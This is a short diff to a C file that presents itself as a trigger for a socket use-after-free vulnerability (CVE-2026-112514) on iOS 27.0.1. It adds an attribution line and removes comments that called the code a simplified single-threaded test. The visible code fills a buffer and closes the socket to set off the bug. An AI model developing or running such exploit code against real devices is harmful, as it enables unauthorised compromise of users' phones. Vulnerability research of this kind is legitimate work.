@@ -1,6 +1,7 @@
 // socket_uaf.c
 // CVE-2026-112514 Socket UAF Trigger
 // iOS 27.0.1, no entitlements needed
+// Based on Tims-Cooked research
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -85,15 +86,9 @@ int main() {
     char *buf = malloc(2 * 1024 * 1024);
     memset(buf, 0x41, 2 * 1024 * 1024);
     
-    // Start async send
-    // Note: In real iOS, use GCD or pthreads
-    // This is simplified for single-threaded test
-    
     fprintf(log, "[*] Filling send buffer...\n");
     
     // Simulate the race: close while send pending
-    // In real exploit, this races with sosend()
-    
     fprintf(log, "[*] Closing socket (UAF trigger)...\n");
     close(sock);
     
